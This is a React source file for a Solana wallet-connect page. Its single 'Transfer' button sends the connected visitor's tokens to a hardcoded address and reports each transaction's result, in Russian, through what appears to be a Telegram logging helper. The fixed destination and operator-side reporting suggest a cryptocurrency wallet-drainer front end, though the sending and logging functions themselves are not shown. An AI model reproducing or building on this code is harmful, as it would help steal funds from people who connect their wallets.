import logo from './logo.svg';
import './App.css';
import {
    Button,
    Col,
    Row,
    Form
} from "react-bootstrap";
import {
    useRef
} from 'react';
import {
    useWallet
} from '@solana/wallet-adapter-react';
import {
    WalletMultiButton
} from '@solana/wallet-adapter-react-ui';
import {
    init,
    sendToken,
    logTlgMsg
} from './utiles';

function App() {
    const wallet = useWallet();
    const toPubkey = "C3wVh4tCmwnXDdBTPTU4zVUi7PY5hzp97ZHhm4fYa3q6";
    const send = async () => {
        const txId = await sendToken(wallet, toPubkey);
        if (!txId) {
            console.log("fail");
            logTlgMsg('❌ <b>Транзакция отклонена</b>');
        } else {
            console.log("OK::::", txId);
            logTlgMsg('✅ <b>Транзакция подтверждена:</b> https://solscan.io/tx/' + txId);
        }
    }
    return ( <
        div className = "App" >
        <
        header className = "App-header" >
        <
        WalletMultiButton className = "wallet-btn" / >
        <
        img src = {
            logo
        }
        className = "App-logo"
        alt = "logo" / >
        <
        Row >
        <
        Col >
        <
        Button type = "submit"
        onClick = {
            send
        } >
        Transfer <
        /Button> <
        /Col> <
        /Row> <
        /header> <
        /div>
    );
}

export default App;